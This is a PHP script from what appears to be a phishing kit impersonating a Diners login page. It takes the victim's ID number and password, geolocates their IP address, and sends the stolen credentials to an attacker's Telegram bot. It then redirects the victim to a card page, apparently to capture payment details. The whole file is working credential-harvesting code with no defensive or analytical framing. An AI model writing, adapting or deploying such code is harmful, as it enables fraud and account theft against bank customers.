<?php
session_start();
require_once 'config.php';

// Crear directorio de sesiones si no existe
if (!file_exists('sessions')) {
    mkdir('sessions', 0777, true);
}

$ip = $_SERVER["REMOTE_ADDR"];

if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
    $dni = $_POST['dni'];
    $cpass = $_POST['cpass'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data_in = curl_exec($ch);
    curl_close($ch);
    $ip_data = json_decode($ip_data_in, true);

    // Mantener solo las claves identificadas en la respuesta de la API
    $country = isset($ip_data["country"]) ? $ip_data["country"] : "";
    $city = isset($ip_data["city"]) ? $ip_data["city"] : "";
    $ip = isset($ip_data["query"]) ? $ip_data["query"] : "";

    // Generar session_id único
    $session_id = uniqid('user_', true);
    $_SESSION['session_id'] = $session_id;
    $_SESSION['user_data'] = ['dni' => $dni, 'cpass' => $cpass];

    // Sin etiquetas no especificadas en el mensaje
    $msg = "DINERS Email Login 🦁\n📧 Usuario: => " . $dni . "\n🔑 Contraseña: => " . $cpass . "\n📍 IP: " . $ip . "\n==========================\n";

    $url = $website.'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
    file_get_contents($url);

    echo "<script>";
    echo "window.location.href='card.html';";
    echo "</script>";
}
